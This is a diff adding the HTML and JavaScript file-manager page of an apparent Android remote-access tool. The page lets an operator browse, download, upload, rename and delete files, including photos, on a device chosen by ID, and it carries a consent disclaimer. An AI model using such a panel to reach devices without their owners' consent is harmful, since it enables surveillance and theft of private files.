@@ -1,0 +1,345 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 16px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+        }
+
+        header::before {
+            display: none;
+        }
+
+        .file-item {
+            display: grid;
+            grid-template-columns: 32px 1fr auto auto;
+            gap: 12px;
+        }
+
+        .btn-small {
+            padding: 4px 10px;
+            font-size: 0.75rem;
+        }
+
+        .breadcrumb-link {
+            color: var(--accent);
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .breadcrumb-link:hover {
+            text-decoration: underline;
+        }
+
+        .breadcrumb-separator {
+            color: var(--text-muted);
+            margin: 0 4px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>File Manager <span class="count-badge" id="file-count" style="display:none">0</span></h1>
+            <a href="index.html" class="btn btn-secondary">&lt;-- Back</a>
+        </header>
+
+        <div class="toolbar">
+            <button class="btn btn-primary" id="btn-upload">UPLOAD FILE</button>
+            <button class="btn btn-primary" id="btn-newfolder">NEW FOLDER</button>
+            <button class="btn btn-secondary" id="btn-home">INTERNAL</button>
+            <button class="btn btn-secondary" id="btn-sdcard">SD CARD</button>
+            <button class="btn btn-secondary" id="btn-dcim">DCIM</button>
+            <button class="btn btn-secondary" id="btn-downloads">DOWNLOADS</button>
+            <button class="btn btn-secondary" id="btn-media">MEDIA</button>
+            <button class="btn btn-secondary" id="btn-refresh">REFRESH</button>
+        </div>
+
+        <input type="file" id="file-input" />
+
+        <div class="breadcrumb" id="breadcrumb"></div>
+
+        <div class="file-list" id="file-list">
+            <div class="loading">Scanning files...</div>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        let currentPath = '/storage';
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // Get file icon based on extension
+        function getFileIcon(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            const iconMap = {
+                // Documents
+                'pdf': '📕', 'doc': '📘', 'docx': '📘', 'txt': '📄', 'rtf': '📄',
+                // Images
+                'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️', 'svg': '🖼️', 'webp': '🖼️',
+                // Videos
+                'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬', 'mov': '🎬', 'wmv': '🎬', 'flv': '🎬', 'webm': '🎬',
+                // Audio
+                'mp3': '🎵', 'wav': '🎵', 'flac': '🎵', 'aac': '🎵', 'ogg': '🎵', 'm4a': '🎵',
+                // Archives
+                'zip': '🗜️', 'rar': '🗜️', '7z': '🗜️', 'tar': '🗜️', 'gz': '🗜️',
+                // Code
+                'js': '📜', 'html': '📜', 'css': '📜', 'json': '📜', 'xml': '📜', 'java': '📜', 'py': '📜', 'kt': '📜',
+                // APK
+                'apk': '📦'
+            };
+            return iconMap[ext] || '📄';
+        }
+
+        // Render clickable breadcrumb
+        function renderBreadcrumb(path) {
+            const breadcrumb = document.getElementById('breadcrumb');
+            const parts = path.split('/').filter(p => p);
+
+            let html = '<span class="breadcrumb-link" onclick="loadFiles(\'/\')">HOME</span>';
+            let currentPath = '';
+
+            parts.forEach((part, index) => {
+                currentPath += '/' + part;
+                const isLast = index === parts.length - 1;
+
+                html += '<span class="breadcrumb-separator">/</span>';
+
+                if (isLast) {
+                    html += `<span>${part}</span>`;
+                } else {
+                    const pathToNavigate = currentPath;
+                    html += `<span class="breadcrumb-link" onclick="loadFiles('${pathToNavigate}')">${part}</span>`;
+                }
+            });
+
+            breadcrumb.innerHTML = html;
+        }
+
+        async function loadFiles(path = currentPath) {
+            try {
+                const response = await api.sendCommand(deviceId, 'files_list', { path });
+
+                if (response.success && response.data) {
+                    currentPath = response.data.path || path;
+                    renderBreadcrumb(currentPath);
+                    renderFiles(response.data.files || []);
+                } else {
+                    throw new Error(response.error || 'Failed to load files');
+                }
+            } catch (error) {
+                console.error(error);
+                api.showToast('Failed to load files: ' + error.message, 'error');
+            }
+        }
+
+        function renderFiles(files) {
+            const container = document.getElementById('file-list');
+            const countEl = document.getElementById('file-count');
+            let html = '';
+
+            // Update count badge
+            countEl.style.display = 'inline-block';
+            countEl.textContent = files.length + ' items';
+
+            // Add Parent Directory item if not at root
+            if (currentPath !== '/storage/emulated/0' && currentPath !== '/storage/emulated/0/') {
+                const parentPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+                html += `
+                    <div class="file-item" onclick="loadFiles('${parentPath}')" style="cursor:pointer">
+                        <div class="file-icon">📁</div>
+                        <div class="file-name" style="color:var(--accent)">.. (Parent Directory)</div>
+                        <div class="file-size"></div>
+                        <div class="file-actions"></div>
+                    </div>
+                `;
+            }
+
+            if (files.length === 0) {
+                countEl.textContent = 'empty';
+                if (!html) html = `
+                    <div class="empty-state">
+                        <h2>Empty Folder</h2>
+                        <p>No files or subdirectories found.</p>
+                    </div>`;
+            } else {
+                html += files.map(file => {
+                    const isFolder = file.type === 'folder' || file.type === 'directory';
+                    const icon = isFolder ? '📁' : getFileIcon(file.name);
+                    const filePath = `${currentPath}/${file.name}`;
+
+                    // For folders: make name clickable
+                    const nameHtml = isFolder
+                        ? `<span class="folder-link" onclick="loadFiles('${filePath}')">${file.name}</span>`
+                        : `<span>${file.name}</span>`;
+
+                    return `
+                        <div class="file-item" data-path="${filePath}" data-type="${file.type}">
+                          <div class="file-icon">${icon}</div>
+                          <div class="file-name">${nameHtml}</div>
+                          <div class="file-size">${file.type === 'file' ? api.formatFileSize(file.size) : ''}</div>
+                          <div class="file-actions">
+                            <button class="btn btn-small btn-secondary" onclick="downloadFile('${file.name}')">DL</button>
+                            <button class="btn btn-small btn-secondary" onclick="renameFile('${file.name}')">REN</button>
+                            <button class="btn btn-small btn-danger" onclick="deleteFile('${file.name}')">DEL</button>
+                          </div>
+                        </div>
+                    `;
+                }).join('');
+            }
+
+            container.innerHTML = html;
+        }
+
+        // Initialize
+        loadFiles();
+
+        // Event Listeners
+        document.getElementById('btn-refresh').addEventListener('click', () => loadFiles(currentPath));
+
+        document.getElementById('btn-home').addEventListener('click', () => loadFiles('/storage/emulated/0'));
+
+        document.getElementById('btn-sdcard').addEventListener('click', () => loadFiles('/storage'));
+
+        document.getElementById('btn-dcim').addEventListener('click', () => loadFiles('/storage/emulated/0/DCIM'));
+
+        document.getElementById('btn-downloads').addEventListener('click', () => loadFiles('/storage/emulated/0/Download'));
+
+        document.getElementById('btn-media').addEventListener('click', () => loadFiles('/storage/emulated/0/Pictures'));
+
+        document.getElementById('btn-newfolder').addEventListener('click', async () => {
+            const folderName = prompt('Enter folder name:');
+            if (!folderName) return;
+
+            if (!/^[a-zA-Z0-9_\-\s]+$/.test(folderName)) {
+                api.showToast('Invalid folder name', 'error');
+                return;
+            }
+
+            try {
+                const response = await api.sendCommand(deviceId, 'file_mkdir', {
+                    path: `${currentPath}/${folderName}`
+                });
+
+                if (response.success && (response.data?.status === 'success' || response.status === 'success')) {
+                    api.showToast('Folder created!', 'success');
+                    loadFiles(currentPath);
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to create folder');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        });
+
+        document.getElementById('btn-upload').addEventListener('click', () => {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (!file) return;
+
+                // Max 20MB check
+                if (file.size > 20 * 1024 * 1024) {
+                    api.showToast('File too large (max 20MB)', 'error');
+                    return;
+                }
+
+                try {
+                    api.showToast('Uploading...', 'info');
+                    await api.uploadFile(deviceId, file, `${currentPath}/${file.name}`);
+                    loadFiles(currentPath);
+                } catch (error) {
+                    // Start matched in api.js
+                }
+            };
+            input.click();
+        });
+
+        // Helper functions
+        async function deleteFile(filename) {
+            if (!confirm(`Delete ${filename}?`)) return;
+            try {
+                const response = await api.sendCommand(deviceId, 'file_delete', {
+                    path: `${currentPath}/${filename}`
+                });
+
+                if (response.success && (response.data?.status === 'success' || response.status === 'success')) {
+                    api.showToast('Deleted successfully', 'success');
+                    loadFiles(currentPath);
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to delete');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+
+        async function renameFile(oldName) {
+            const newName = prompt('Enter new name:', oldName);
+            if (!newName || newName === oldName) return;
+
+            if (!/^[a-zA-Z0-9_\-\s.]+$/.test(newName)) {
+                api.showToast('Invalid filename', 'error');
+                return;
+            }
+
+            try {
+                const response = await api.sendCommand(deviceId, 'file_rename', {
+                    oldPath: `${currentPath}/${oldName}`,
+                    newPath: `${currentPath}/${newName}`
+                });
+
+                if (response.success && (response.data?.status === 'success' || response.status === 'success')) {
+                    api.showToast('Renamed successfully', 'success');
+                    loadFiles(currentPath);
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to rename');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+
+        function downloadFile(filename) {
+            api.downloadFile(deviceId, `${currentPath}/${filename}`);
+        }
+    </script>
+
+    <!-- Disclaimer -->
+    <div class="container">
+        <div class="disclaimer">
+            <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely
+                manage their own devices. Installing or using this application on a device without the owner's explicit
+                consent is illegal and unethical. The developers assume no liability for misuse. By using this
+                application, you agree that you are solely responsible for how it is used.</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        <p class="footer-created">Created by</p>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+        <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+    </footer>
+</body>
+
+</html>
